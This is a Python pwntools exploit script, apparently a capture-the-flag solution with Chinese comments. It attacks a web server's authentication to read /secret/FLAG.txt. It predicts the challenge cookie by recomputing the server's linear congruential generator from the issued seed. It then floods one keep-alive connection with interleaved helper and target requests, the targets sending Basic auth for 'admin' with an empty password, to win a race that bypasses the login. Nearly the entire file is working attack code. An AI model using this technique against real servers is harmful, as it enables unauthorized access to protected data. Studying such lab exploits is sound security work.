#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import re
import base64
import time
import traceback

# --- Configuration ---
HOST = 'up.zoolab.org'
PORT = 10933

NUM_CYCLES = 100  # 交替循環的次數
HELPERS_PER_TARGET = 2 # 每個目標請求前有多少個輔助請求 (例如 H, H, T)
TIMEOUT = 15 

# 身份驗證資訊 (使用空密碼)
USERNAME = b'admin'
PASSWORD = b''


# ================================================
# BEGIN Necessary Function Definitions
# ================================================
def calculate_x2(reqseed):
    result = (reqseed * 6364136223846793005 + 1) & 0xFFFFFFFFFFFFFFFF
    x2 = result >> 33
    return x2

def build_request(method, path, host, port, headers=None, body=b''):
    req = f"{method} {path} HTTP/1.1\r\n"
    req += f"Host: {host}:{port}\r\n"
    req += "Connection: keep-alive\r\n"
    if headers:
        for key, value in headers.items():
            req += f"{key}: {value}\r\n"
    req += "\r\n"
    req_bytes = req.encode('utf-8') + body
    return req_bytes

def parse_headers(response_bytes):
    headers = {}
    header_end_index = response_bytes.find(b'\r\n\r\n')
    if header_end_index == -1:
        log.warning("Could not find end of headers in response fragment.")
        return headers
    header_part = response_bytes[:header_end_index]
    lines = header_part.split(b'\r\n')
    for line in lines[1:]:
        if b':' in line:
            try:
                key, value = line.split(b': ', 1)
                headers[key.lower()] = value
            except ValueError:
                log.debug(f"Skipping malformed header line: {line}")
                continue
    return headers
# ================================================
# END Necessary Function Definitions
# ================================================

# --- 主要攻擊邏輯 (單次嘗試，快速交替) ---
context.log_level = 'info'
flag_found = False
p = None

log.info(f"Using {NUM_CYCLES} cycles, {HELPERS_PER_TARGET} helpers per target. Sending EMPTY password.")

try:
    # 1. 建立唯一連線
    log.info(f"Connecting to {HOST}:{PORT}...")
    p = remote(HOST, PORT, timeout=TIMEOUT)
    # log.info("Connection established.")

    # 2. 在同一個連線上，先獲取 Cookie 資訊
    initial_req_for_cookie = build_request("GET", "/secret/FLAG.txt", HOST, PORT)
    p.send(initial_req_for_cookie)

    initial_resp_headers_part = p.recvuntil(b'\r\n\r\n', drop=False, timeout=TIMEOUT)
    if not initial_resp_headers_part or b'401 Auth Required' not in initial_resp_headers_part:
        log.error("Did not receive expected 401 response for initial request to get reqseed.")
        raise Exception("Failed to get reqseed")
    initial_headers = parse_headers(initial_resp_headers_part)
    initial_cl = int(initial_headers.get(b'content-length', b'0'))
    if initial_cl > 0:
        try: p.recvn(initial_cl, timeout=TIMEOUT) # 丟棄 401 的 body
        except Exception as e: log.warning(f"Error discarding initial body: {e}")

    set_cookie_header = initial_headers.get(b'set-cookie')
    if not set_cookie_header: raise Exception("Set-Cookie header not found after initial request.")
    match = re.search(rb'challenge=(\d+);', set_cookie_header)
    if not match: raise Exception("Failed to parse reqseed from initial response.")

    reqseed = int(match.group(1))
    x2 = calculate_x2(reqseed)
    log.info(f"Got reqseed: {reqseed} and Calculated required cookie 'response': {x2}")

    # 3. 準備快速交替的 Payload
    auth_str = base64.b64encode(USERNAME + b':' + PASSWORD).decode('utf-8') # PASSWORD is b''
    log.info(f"Using Authorization: Basic {auth_str} for target requests.")

    target_headers = {
        "Authorization": f"Basic {auth_str}",
        "Cookie": f"response={x2}" # 所有目標請求使用同一個計算好的 x2
    }
    target_req = build_request("GET", "/secret/FLAG.txt", HOST, PORT, headers=target_headers)
    helper_req = build_request("GET", "/", HOST, PORT)

    payload_parts = []
    for _ in range(NUM_CYCLES):
        for _ in range(HELPERS_PER_TARGET):
            payload_parts.append(helper_req)
        payload_parts.append(target_req)

    payload = b"".join(payload_parts)
    total_requests_in_payload = len(payload_parts) # 總請求數 (不含拿cookie那次)

    # 4. 發送組合 Payload
    p.send(payload)

    # 5. 接收並解析所有回應
    # 我們需要接收 1 (初始獲取cookie) + total_requests_in_payload 個回應
    expected_responses_total = 1 + total_requests_in_payload
    # 但我們只關心 payload 發送後的回應
    received_payload_responses = 0

    while received_payload_responses < total_requests_in_payload:
        try:
            status_line = p.recvline(timeout=TIMEOUT)
            if not status_line:
                log.warning(f"Connection closed prematurely (received {received_payload_responses}/{total_requests_in_payload} from payload).")
                break
            response_headers_bytes = p.recvuntil(b'\r\n\r\n', drop=True, timeout=TIMEOUT)
            if not response_headers_bytes:
                 log.warning(f"Connection closed prematurely waiting for headers (received {received_payload_responses}/{total_requests_in_payload} from payload).")
                 break

            full_header_bytes = status_line + response_headers_bytes + b'\r\n\r\n'
            resp_headers = parse_headers(full_header_bytes)
            content_length = int(resp_headers.get(b'content-length', b'0'))
            response_body = b''
            if content_length > 0:
                try: response_body = p.recvn(content_length, timeout=TIMEOUT)
                except Exception as e: log.warning(f"Error receiving body for response {received_payload_responses+1}: {e}")

            # 6. 檢查 Flag
            # 任何一個 200 OK 且包含 Flag 的都算成功
            if b' 200 OK' in status_line and b'FLAG{' in response_body:
                if not response_body.strip().lower().startswith(b'<html') and len(response_body) < 200: # 啟發式檢查
                    # log.success("---------- !!! Flag Found !!! ----------")
                    print("="*20 + " FLAG Found RESPONSE " + "="*20)
                    print(status_line.decode(errors='ignore').strip())
                    print(response_body.decode(errors='ignore'))
                    print("="*55)
                    flag_found = True
                    # break 

            received_payload_responses += 1
            if flag_found: break


        except EOFError:
            log.warning(f"EOFError. Connection closed by server after {received_payload_responses}/{total_requests_in_payload} payload responses.")
            break
        except Exception as e:
            log.error(f"Error receiving payload response {received_payload_responses+1}: {e}")
            break

    # 7. 最終結果
    if not flag_found:
        log.critical("Flag not found in this fast alternating attempt.")
        log.info(f"Consider adjusting NUM_CYCLES ({NUM_CYCLES}) or HELPERS_PER_TARGET ({HELPERS_PER_TARGET}).")

except Exception as e:
    log.error(f"An overall error occurred: {e}")
    traceback.print_exc()
finally:
    if p:
        p.close()
